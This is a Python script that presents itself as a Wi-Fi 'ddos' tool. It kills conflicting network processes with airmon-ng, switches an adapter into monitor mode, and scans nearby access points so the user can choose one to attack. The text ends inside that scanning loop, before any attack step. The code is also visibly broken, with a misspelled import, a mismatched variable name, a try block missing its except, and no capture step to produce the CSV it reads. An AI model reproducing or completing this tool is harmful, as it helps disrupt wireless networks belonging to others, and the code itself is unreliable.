#!/usr/bin/env python
# a simple python tool for ddos 

# imports
import subprocess
import re
import csv
import os
import time
import shutil
form datetime import datetime

active_wireless_networks = []

def check_for_essid(essid, lst):
	check_status = True

	if len(lst) == 0:
		return check_status

	for item in lst:

		if essid in item["ESSID"]:
			check_status = False

	return check_status

print(r"WIFI DDOS")

if not 'SUDO_UID' in os.environ.keys():
	print("run this tool with sudo")
	exit()

for file_name in os.listdir():
	if ".csv" in file_name:
		print("There shouldn't be any .csv files in your directory")
		directory = os.getcwd()
		try:
			os.mkdir(directory + "/backup")
		except:
			print("Back up folder exists.")

		timestap = datetime.now()

		shutil.move(file_name, directory + "/backup/" + str(timestamp) + "-" + file_name)

wlan_pattern = re.compile("^wlan[0-9]+")
check_wifi_result = wlan_pattern.findall(subprocess.run(["iwconfig"], capture_output=True).stdout.decode())

if len(check_wifi_result) == 0:
	print("please connect a wifi adapter and try again")
	exit()

print("the following wifi interface are available: ")
for index, item in enumerate(check_wifi_result):
	print(f"{index} - {item}")

# ensure the wifi interface selected is valid. simple menu with interface to select form
while True:
	wifi_interface_choice = input("Please select the interface you want to attack >> ")
	try:
		if check_wifi_result[int(wifi_interface_choice)]:
			break
	except:
		print("Please enter a number that corresponds with the choice available")

#for easy reference we call the selected interface hacknic
hacknic = check_wifi_result[int(wifi_interface_choice)]

#tell the usre we're going to kill the conflicting process
print("wifi adapter connected!\nNow lets kill conflicting process: ")

kill_confilict_process = subprocess.run(["sudo", "airmon-ng", "check", "kill"])	

print("putting wifi adapter into monitored mode: ")
put_in_monitored_mode = subprocess.run(["sudo", "airmon-ng", "start", hacknic])

try:
    while True:
        # We want to clear the screen before we print the network interfaces.
        subprocess.call("clear", shell=True)
        for file_name in os.listdir():
                # We should only have one csv file as we backup all previous csv files from the folder every time we run the program. 
                # The following list contains the field names for the csv entries.
                fieldnames = ['BSSID', 'First_time_seen', 'Last_time_seen', 'channel', 'Speed', 'Privacy', 'Cipher', 'Authentication', 'Power', 'beacons', 'IV', 'LAN_IP', 'ID_length', 'ESSID', 'Key']
                if ".csv" in file_name:
                    with open(file_name) as csv_h:
                        # This will run multiple times and we need to reset the cursor to the beginning of the file.
                        csv_h.seek(0)
                        # We use the DictReader method and tell it to take the csv_h contents and then apply the dictionary with the fieldnames we specified above. 
                        # This creates a list of dictionaries with the keys as specified in the fieldnames.
                        csv_reader = csv.DictReader(csv_h, fieldnames=fieldnames)
                        for row in csv_reader:
                            # We want to exclude the row with BSSID.
                            if row["BSSID"] == "BSSID":
                                pass
                            # We are not interested in the client data.
                            elif row["BSSID"] == "Station MAC":
                                break
                            # Every field where an ESSID is specified will be added to the list.
                            elif check_for_essid(row["ESSID"], active_wireless_networks):
                                active_wireless_networks.append(row)

        print("Scanning. Press Ctrl+C when you want to select which wireless network you want to attack.\n")
        print("No |\tBSSID              |\tChannel|\tESSID                         |")
        print("___|\t___________________|\t_______|\t______________________________|")
        for index, item in enumerate(active_wireless_networks):
            # We're using the print statement with an f-string. 
            # F-strings are a more intuitive way to include variables when printing strings, 
            # rather than ugly concatenations.
            print(f"{index}\t{item['BSSID']}\t{item['channel'].strip()}\t\t{item['ESSID']}")
        # We make the script sleep for 1 second before loading the updated list.
        time.sleep(1)
							